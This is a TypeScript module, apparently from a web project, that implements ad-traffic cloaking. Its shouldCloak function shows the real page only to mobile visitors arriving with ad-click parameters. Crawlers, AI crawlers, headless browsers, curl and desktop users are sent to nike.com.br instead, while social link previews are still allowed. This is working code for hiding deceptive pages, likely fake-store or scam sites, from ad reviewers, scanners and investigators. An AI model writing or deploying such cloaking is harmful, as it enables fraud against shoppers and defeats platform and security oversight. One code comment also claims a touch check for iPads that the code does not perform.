export const CLOAKER_REDIRECT_URL = "https://nike.com.br";
export const CLOAKER_COOKIE = "cloaker_disabled";
export const CLOAKER_DISABLE_PARAM = "disable_cloaker";
export const CLOAKER_STORAGE_KEY = "cloaker_disabled";

const MOBILE_UA =
  /Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|Silk/i;
const IPAD_UA = /iPad|Macintosh/i;

const BOT_UA =
  /bot\b|crawler|crawling|spider|slurp|bingpreview|duckduck|baidu|yandex|sogou|exabot|ia_archiver|ahrefs|semrush|mj12bot|petalbot|applebot|google-?(?:read|inspection|other|extended)|gptbot|chatgpt|claudebot|anthropic|perplexity|cohere|amazonbot|bytespider|headlesschrome|phantomjs|puppeteer|playwright|selenium|httpclient|python-requests|curl\/|wget\/|go-http-client|okhttp|java\//i;

const SOCIAL_PREVIEW_UA =
  /facebookexternalhit|facebookcatalog|whatsapp|twitterbot|linkedinbot|telegrambot|discordbot|slackbot|skypeuripreview|vkshare|pinterest/i;

const UTM_KEYS = [
  "utm_source",
  "utm_medium",
  "utm_campaign",
  "utm_term",
  "utm_content",
  "utm_id",
  "fbclid",
  "gclid",
  "ttclid",
  "xcod",
];

export function isMobileUA(ua: string): boolean {
  if (!ua) return false;
  if (MOBILE_UA.test(ua)) return true;
  // iPadOS 13+ identifica-se como Macintosh; só consideramos quando tem touch hint
  if (/iPad/i.test(ua)) return true;
  return false;
}

export function isBotUA(ua: string): boolean {
  if (!ua) return true;
  return BOT_UA.test(ua);
}

export function isSocialPreviewUA(ua: string): boolean {
  if (!ua) return false;
  return SOCIAL_PREVIEW_UA.test(ua);
}

export function hasUtm(searchParams: URLSearchParams): boolean {
  for (const key of UTM_KEYS) {
    if (searchParams.has(key)) return true;
  }
  return false;
}

export function shouldCloak(params: {
  ua: string;
  search: URLSearchParams;
}): boolean {
  const { ua, search } = params;
  if (isSocialPreviewUA(ua)) return false; // preserva OG / link preview
  if (isBotUA(ua)) return true;
  if (!isMobileUA(ua)) return true;
  if (!hasUtm(search)) return true;
  return false;
}
